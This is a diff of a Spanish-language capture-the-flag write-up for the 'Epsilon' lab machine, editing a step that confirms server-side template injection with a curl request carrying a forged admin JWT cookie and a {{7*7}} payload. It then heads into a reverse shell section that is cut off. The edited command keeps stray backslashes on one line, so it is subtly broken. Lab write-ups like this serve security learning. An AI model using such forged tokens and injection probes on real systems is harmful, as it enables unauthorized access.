@@ -173,13 +173,10 @@ Luego navegamos a: http://epsilon.htb:5000/home y vemos que ya somos admin
 Explotación SSTI
 Verificar Vulnerabilidad
 ```
-curl -X POST http://10.10.11.134:5000/order \
-  -H "Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4" \
-  --data-urlencode "costume={{7*7}}"
+curl -X POST http://10.10.11.134:5000/order \ -H "Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4" \ --data-urlencode "costume={{7*7}}" | grep 49
 ```
 Respuesta contiene "49" → SSTI confirmado
-
-https://./images/ssti_test.png
+![SSTI](49.png)
 
 Reverse Shell
 Preparar listener:
